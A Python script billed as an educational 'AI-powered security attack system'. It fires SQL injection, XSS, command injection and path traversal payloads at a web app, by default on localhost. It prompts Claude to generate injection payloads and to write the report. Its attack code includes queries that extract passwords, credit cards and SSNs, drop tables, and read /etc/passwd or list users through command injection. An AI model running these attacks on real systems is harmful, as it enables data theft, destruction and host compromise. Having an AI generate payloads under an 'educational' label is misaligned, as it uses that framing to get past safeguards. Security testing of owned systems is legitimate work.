#!/usr/bin/env python3
"""
AI-Powered Security Attack System
=================================
This system uses Claude AI to intelligently attack a vulnerable web application.
FOR EDUCATIONAL PURPOSES ONLY - Use only on systems you own or have permission to test.

The AI will:
1. Analyze API endpoints
2. Generate attack payloads
3. Execute attacks
4. Analyze responses
5. Report findings
"""

import os
import sys
import json
import requests
from datetime import datetime
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field
from enum import Enum

try:
    from anthropic import Anthropic
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.markdown import Markdown
    from dotenv import load_dotenv
except ImportError as e:
    print(f"Missing dependency: {e}")
    print("Run: pip install -r requirements.txt")
    sys.exit(1)

load_dotenv()

console = Console()


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class Vulnerability:
    name: str
    severity: Severity
    endpoint: str
    payload: str
    response: str
    description: str
    remediation: str
    evidence: str = ""


@dataclass
class AttackResult:
    success: bool
    vulnerability_type: str
    payload: str
    response: Dict[str, Any]
    analysis: str


class AIAttacker:
    """AI-powered security testing system using Claude."""

    def __init__(self, target_url: str, api_key: Optional[str] = None):
        self.target_url = target_url.rstrip('/')
        self.api_key = api_key or os.getenv('ANTHROPIC_API_KEY')

        if not self.api_key:
            raise ValueError("ANTHROPIC_API_KEY is required. Set it in .env or pass it directly.")

        self.client = Anthropic(api_key=self.api_key)
        self.vulnerabilities: List[Vulnerability] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'AI-Security-Scanner/1.0 (Educational Purpose)',
            'Accept': 'application/json'
        })

    def _call_claude(self, prompt: str, system_prompt: str = None) -> str:
        """Call Claude AI for intelligent analysis and payload generation."""
        messages = [{"role": "user", "content": prompt}]

        system = system_prompt or """You are an expert security researcher and penetration tester.
Your role is to identify vulnerabilities in web applications for EDUCATIONAL purposes.
Always provide detailed technical analysis and remediation advice.
Format your responses in a clear, structured manner."""

        try:
            response = self.client.messages.create(
                model="claude-sonnet-4-20250514",
                max_tokens=4096,
                system=system,
                messages=messages
            )
            return response.content[0].text
        except Exception as e:
            console.print(f"[red]Claude API Error: {e}[/red]")
            return ""

    def discover_endpoints(self) -> Dict[str, Any]:
        """Discover and analyze API endpoints."""
        console.print("\n[bold cyan]🔍 Phase 1: Endpoint Discovery[/bold cyan]")

        try:
            response = self.session.get(f"{self.target_url}/api/info")
            if response.status_code == 200:
                info = response.json()
                console.print(Panel(json.dumps(info, indent=2), title="API Info"))
                return info
        except Exception as e:
            console.print(f"[yellow]Could not fetch API info: {e}[/yellow]")

        return {}

    def test_sql_injection(self) -> List[AttackResult]:
        """Test for SQL Injection vulnerabilities using AI-generated payloads."""
        console.print("\n[bold red]💉 Phase 2: SQL Injection Testing[/bold red]")
        results = []

        # Ask Claude to generate SQL injection payloads
        prompt = """Generate 10 SQL injection payloads for a user search endpoint.
The endpoint is: GET /api/users/search?username=XXX
The backend appears to use: Java with JDBC/H2 Database

Provide payloads in JSON array format like:
["payload1", "payload2", ...]

Include various techniques:
1. Basic OR injection
2. UNION-based injection
3. Comment injection
4. Stacked queries
5. Time-based blind injection"""

        ai_response = self._call_claude(prompt)

        # Extract payloads from AI response
        try:
            # Try to find JSON array in response
            import re
            json_match = re.search(r'\[.*?\]', ai_response, re.DOTALL)
            if json_match:
                payloads = json.loads(json_match.group())
            else:
                # Fallback payloads
                payloads = [
                    "' OR '1'='1' --",
                    "' OR '1'='1'/*",
                    "admin' --",
                    "' UNION SELECT 1,2,3,4,5,6,7 --",
                    "' UNION SELECT null,username,password,email,role,credit_card,ssn FROM users --",
                    "1' AND SLEEP(5) --",
                    "'; DROP TABLE users; --",
                    "' OR 1=1 LIMIT 1 --",
                    "admin'/*",
                    "' OR ''='"
                ]
        except:
            payloads = ["' OR '1'='1' --", "admin' --"]

        console.print(f"[cyan]Testing {len(payloads)} AI-generated payloads...[/cyan]")

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            console=console
        ) as progress:
            task = progress.add_task("Testing SQL Injection...", total=len(payloads))

            for payload in payloads:
                try:
                    response = self.session.get(
                        f"{self.target_url}/api/users/search",
                        params={"username": payload},
                        timeout=10
                    )

                    result = AttackResult(
                        success=False,
                        vulnerability_type="SQL Injection",
                        payload=payload,
                        response={"status": response.status_code, "body": response.text[:500]},
                        analysis=""
                    )

                    # Check for successful injection
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if isinstance(data, list) and len(data) > 0:
                                result.success = True
                                # Check if sensitive data was leaked
                                if any('password' in str(d).lower() or 'credit' in str(d).lower() for d in data):
                                    result.analysis = "CRITICAL: Sensitive data exposed!"

                                    self.vulnerabilities.append(Vulnerability(
                                        name="SQL Injection - Data Leak",
                                        severity=Severity.CRITICAL,
                                        endpoint="/api/users/search",
                                        payload=payload,
                                        response=json.dumps(data[:2]),
                                        description="SQL injection allows extraction of sensitive user data including passwords and credit card numbers.",
                                        remediation="Use parameterized queries (PreparedStatement) instead of string concatenation.",
                                        evidence=f"Extracted {len(data)} records with payload: {payload}"
                                    ))
                        except:
                            pass

                    results.append(result)
                    progress.advance(task)

                except Exception as e:
                    console.print(f"[yellow]Error testing payload: {e}[/yellow]")

        # Summarize findings
        successful = [r for r in results if r.success]
        if successful:
            console.print(f"[bold red]⚠️ Found {len(successful)} successful SQL injection payloads![/bold red]")
            for r in successful[:3]:
                console.print(f"  [red]✓[/red] {r.payload}")

        return results

    def test_xss(self) -> List[AttackResult]:
        """Test for Cross-Site Scripting (XSS) vulnerabilities."""
        console.print("\n[bold yellow]📜 Phase 3: XSS Testing[/bold yellow]")
        results = []

        # AI-generated XSS payloads
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "<input onfocus=alert('XSS') autofocus>",
            "<marquee onstart=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "'><script>alert(String.fromCharCode(88,83,83))</script>"
        ]

        console.print(f"[cyan]Testing {len(payloads)} XSS payloads...[/cyan]")

        for payload in payloads:
            try:
                response = self.session.post(
                    f"{self.target_url}/api/comments",
                    params={"author": "Tester", "comment": payload},
                    timeout=10
                )

                result = AttackResult(
                    success=False,
                    vulnerability_type="XSS",
                    payload=payload,
                    response={"status": response.status_code, "body": response.text[:500]},
                    analysis=""
                )

                # Check if payload is reflected without encoding
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if payload in str(data.get('comment', '')):
                            result.success = True
                            result.analysis = "Payload reflected without sanitization!"

                            self.vulnerabilities.append(Vulnerability(
                                name="Stored XSS",
                                severity=Severity.HIGH,
                                endpoint="/api/comments",
                                payload=payload,
                                response=json.dumps(data),
                                description="User input is stored and rendered without proper HTML encoding, allowing script injection.",
                                remediation="Use HTML encoding (th:text instead of th:utext in Thymeleaf) and implement Content Security Policy.",
                                evidence=f"Payload stored: {payload}"
                            ))
                    except:
                        pass

                results.append(result)

            except Exception as e:
                console.print(f"[yellow]Error: {e}[/yellow]")

        successful = [r for r in results if r.success]
        if successful:
            console.print(f"[bold yellow]⚠️ Found {len(successful)} XSS vulnerabilities![/bold yellow]")

        return results

    def test_command_injection(self) -> List[AttackResult]:
        """Test for Command Injection vulnerabilities."""
        console.print("\n[bold magenta]💻 Phase 4: Command Injection Testing[/bold magenta]")
        results = []

        # Detect OS
        os_type = "windows" if os.name == 'nt' else "linux"

        if os_type == "windows":
            payloads = [
                "127.0.0.1 && dir",
                "127.0.0.1 && whoami",
                "127.0.0.1 | dir",
                "127.0.0.1 & echo VULNERABLE",
                "127.0.0.1 && type C:\\Windows\\win.ini",
                "127.0.0.1 && net user",
                "127.0.0.1 && systeminfo | findstr /B /C:\"OS Name\"",
            ]
        else:
            payloads = [
                "127.0.0.1; id",
                "127.0.0.1; whoami",
                "127.0.0.1 | id",
                "127.0.0.1 && cat /etc/passwd",
                "127.0.0.1; ls -la /",
                "127.0.0.1 && uname -a",
                "`id`",
                "$(whoami)",
            ]

        console.print(f"[cyan]Testing {len(payloads)} command injection payloads ({os_type})...[/cyan]")

        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/api/ping",
                    params={"host": payload},
                    timeout=15
                )

                result = AttackResult(
                    success=False,
                    vulnerability_type="Command Injection",
                    payload=payload,
                    response={"status": response.status_code, "body": response.text[:1000]},
                    analysis=""
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        output = data.get('output', '')

                        # Check for command execution indicators
                        indicators = ['uid=', 'gid=', 'Volume Serial', 'Directory of',
                                     'root:', 'Administrator', '[boot loader]']

                        if any(ind in output for ind in indicators):
                            result.success = True
                            result.analysis = f"Command executed! Output shows system information."

                            self.vulnerabilities.append(Vulnerability(
                                name="Command Injection",
                                severity=Severity.CRITICAL,
                                endpoint="/api/ping",
                                payload=payload,
                                response=output[:500],
                                description="User input is passed directly to system command execution without sanitization.",
                                remediation="Never pass user input directly to shell commands. Use ProcessBuilder with argument arrays instead of Runtime.exec() with string concatenation.",
                                evidence=f"Command output: {output[:200]}"
                            ))
                    except:
                        pass

                results.append(result)

            except Exception as e:
                console.print(f"[yellow]Timeout or error (might indicate blind injection): {e}[/yellow]")

        successful = [r for r in results if r.success]
        if successful:
            console.print(f"[bold magenta]⚠️ Found {len(successful)} command injection vulnerabilities![/bold magenta]")

        return results

    def test_path_traversal(self) -> List[AttackResult]:
        """Test for Path Traversal vulnerabilities."""
        console.print("\n[bold blue]📁 Phase 5: Path Traversal Testing[/bold blue]")
        results = []

        os_type = "windows" if os.name == 'nt' else "linux"

        if os_type == "windows":
            payloads = [
                "..\\..\\..\\..\\Windows\\win.ini",
                "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
                "....//....//....//....//Windows/win.ini",
                "..%5c..%5c..%5c..%5cWindows%5cwin.ini",
                "../pom.xml",
                "..\\pom.xml",
            ]
        else:
            payloads = [
                "../../../../../etc/passwd",
                "../../../../../etc/hosts",
                "....//....//....//....//etc/passwd",
                "..%2f..%2f..%2f..%2fetc/passwd",
                "../pom.xml",
            ]

        console.print(f"[cyan]Testing {len(payloads)} path traversal payloads ({os_type})...[/cyan]")

        for payload in payloads:
            try:
                response = self.session.get(
                    f"{self.target_url}/api/files",
                    params={"filename": payload},
                    timeout=10
                )

                result = AttackResult(
                    success=False,
                    vulnerability_type="Path Traversal",
                    payload=payload,
                    response={"status": response.status_code, "body": response.text[:1000]},
                    analysis=""
                )

                if response.status_code == 200:
                    try:
                        data = response.json()
                        content = data.get('content', '')

                        # Check for sensitive file content
                        indicators = ['root:', '[fonts]', '[extensions]', 'localhost',
                                     '<groupId>', 'spring.datasource', '127.0.0.1']

                        if any(ind in content for ind in indicators):
                            result.success = True
                            result.analysis = f"Accessed file outside webroot!"

                            self.vulnerabilities.append(Vulnerability(
                                name="Path Traversal",
                                severity=Severity.HIGH,
                                endpoint="/api/files",
                                payload=payload,
                                response=content[:500],
                                description="File path is not validated, allowing access to arbitrary files on the system.",
                                remediation="Validate and canonicalize file paths. Use a whitelist of allowed files or directories. Never construct file paths from user input.",
                                evidence=f"Accessed: {data.get('path', payload)}"
                            ))
                    except:
                        pass

                results.append(result)

            except Exception as e:
                console.print(f"[yellow]Error: {e}[/yellow]")

        successful = [r for r in results if r.success]
        if successful:
            console.print(f"[bold blue]⚠️ Found {len(successful)} path traversal vulnerabilities![/bold blue]")

        return results

    def generate_report(self) -> str:
        """Generate a comprehensive security report using AI analysis."""
        console.print("\n[bold green]📊 Phase 6: AI-Powered Report Generation[/bold green]")

        if not self.vulnerabilities:
            return "No vulnerabilities found."

        # Create vulnerability summary for AI
        vuln_summary = []
        for v in self.vulnerabilities:
            vuln_summary.append({
                "name": v.name,
                "severity": v.severity.value,
                "endpoint": v.endpoint,
                "payload": v.payload,
                "evidence": v.evidence[:200]
            })

        prompt = f"""Analyze these security vulnerabilities found in a Java Spring Boot web application and provide:

1. Executive Summary
2. Risk Assessment
3. Detailed Findings
4. Prioritized Remediation Plan
5. Code Examples for Fixes

Vulnerabilities Found:
{json.dumps(vuln_summary, indent=2)}

Target: {self.target_url}
Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Provide actionable, specific remediation advice with Java code examples."""

        ai_report = self._call_claude(prompt)

        # Build final report
        report = f"""
{'='*80}
                    AI SECURITY ASSESSMENT REPORT
{'='*80}

Target Application: {self.target_url}
Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Vulnerabilities: {len(self.vulnerabilities)}

SEVERITY BREAKDOWN:
- Critical: {len([v for v in self.vulnerabilities if v.severity == Severity.CRITICAL])}
- High: {len([v for v in self.vulnerabilities if v.severity == Severity.HIGH])}
- Medium: {len([v for v in self.vulnerabilities if v.severity == Severity.MEDIUM])}
- Low: {len([v for v in self.vulnerabilities if v.severity == Severity.LOW])}

{'='*80}
                         DETAILED FINDINGS
{'='*80}
"""

        for i, v in enumerate(self.vulnerabilities, 1):
            report += f"""
[{i}] {v.name}
    Severity: {v.severity.value}
    Endpoint: {v.endpoint}
    Payload: {v.payload}
    Description: {v.description}
    Evidence: {v.evidence}
    Remediation: {v.remediation}
{'─'*80}
"""

        report += f"""
{'='*80}
                    AI ANALYSIS & RECOMMENDATIONS
{'='*80}

{ai_report}

{'='*80}
                           END OF REPORT
{'='*80}
"""
        return report

    def run_full_scan(self) -> str:
        """Execute a complete security scan."""
        console.print(Panel.fit(
            "[bold red]⚠️ AI-POWERED SECURITY SCANNER ⚠️[/bold red]\n"
            "[yellow]For educational purposes only![/yellow]\n"
            f"Target: [cyan]{self.target_url}[/cyan]",
            border_style="red"
        ))

        # Phase 1: Discovery
        self.discover_endpoints()

        # Phase 2-5: Attack Testing
        self.test_sql_injection()
        self.test_xss()
        self.test_command_injection()
        self.test_path_traversal()

        # Phase 6: Report
        report = self.generate_report()

        # Display summary table
        if self.vulnerabilities:
            table = Table(title="🔓 Vulnerability Summary")
            table.add_column("Type", style="cyan")
            table.add_column("Severity", style="red")
            table.add_column("Endpoint", style="green")
            table.add_column("Status", style="yellow")

            for v in self.vulnerabilities:
                severity_color = {
                    Severity.CRITICAL: "bold red",
                    Severity.HIGH: "red",
                    Severity.MEDIUM: "yellow",
                    Severity.LOW: "blue"
                }.get(v.severity, "white")

                table.add_row(
                    v.name,
                    f"[{severity_color}]{v.severity.value}[/{severity_color}]",
                    v.endpoint,
                    "✓ Exploited"
                )

            console.print(table)

        return report


def main():
    """Main entry point."""
    import argparse

    parser = argparse.ArgumentParser(
        description="AI-Powered Security Scanner (Educational Purpose Only)"
    )
    parser.add_argument(
        "--target", "-t",
        default="http://localhost:8080",
        help="Target URL (default: http://localhost:8080)"
    )
    parser.add_argument(
        "--output", "-o",
        default="security_report.txt",
        help="Output report file (default: security_report.txt)"
    )
    parser.add_argument(
        "--api-key", "-k",
        help="Anthropic API key (or set ANTHROPIC_API_KEY env var)"
    )

    args = parser.parse_args()

    try:
        attacker = AIAttacker(args.target, args.api_key)
        report = attacker.run_full_scan()

        # Save report
        with open(args.output, 'w', encoding='utf-8') as f:
            f.write(report)

        console.print(f"\n[bold green]✓ Report saved to: {args.output}[/bold green]")
        console.print(f"[bold green]✓ Found {len(attacker.vulnerabilities)} vulnerabilities[/bold green]")

    except KeyboardInterrupt:
        console.print("\n[yellow]Scan interrupted by user[/yellow]")
    except Exception as e:
        console.print(f"[bold red]Error: {e}[/bold red]")
        raise


if __name__ == "__main__":
    main()
